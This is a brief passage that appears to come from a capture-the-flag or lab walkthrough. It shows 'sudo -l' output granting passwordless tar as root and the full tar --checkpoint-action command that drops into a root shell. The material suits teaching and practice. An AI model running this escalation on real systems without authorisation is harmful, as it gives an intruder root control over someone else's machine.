`sudo -l`

```
User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

We can run tar as root!

https://gtfobins.github.io/gtfobins/tar/

By running the following, we drop into a shell as root:

`sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=/bin/sh`
